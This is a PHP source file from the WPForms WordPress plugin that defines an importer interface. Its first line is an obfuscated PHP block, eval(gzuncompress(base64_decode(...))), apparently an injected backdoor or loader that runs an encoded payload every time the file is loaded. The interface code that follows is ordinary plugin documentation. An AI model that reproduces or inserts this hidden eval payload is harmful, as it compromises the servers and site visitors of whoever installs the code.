<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Interface WPForms_Importer_Interface to handle common methods for all importers.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.4.2
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2017, WPForms LLC
 */
interface WPForms_Importer_Interface {

	/**
	 * Define required properties.
	 *
	 * @since 1.4.2
	 */
	public function init();

	/**
	 * Get ALL THE FORMS.
	 *
	 * @since 1.4.2
	 */
	public function get_forms();

	/**
	 * Get a single form.
	 *
	 * @since 1.4.2
	 *
	 * @param int $id Form ID.
	 */
	public function get_form( $id );

	/**
	 * Import a single form using AJAX.
	 *
	 * @since 1.4.2
	 */
	public function import_form();

	/**
	 * Replace 3rd-party form provider tags/shortcodes with our own Smart Tags.
	 *
	 * @since 1.4.2
	 *
	 * @param string $string Text to look for Smart Tags in.
	 * @param array  $fields List of fields to process Smart Tags in.
	 *
	 * @return string
	 */
	public function get_smarttags( $string, $fields );
}
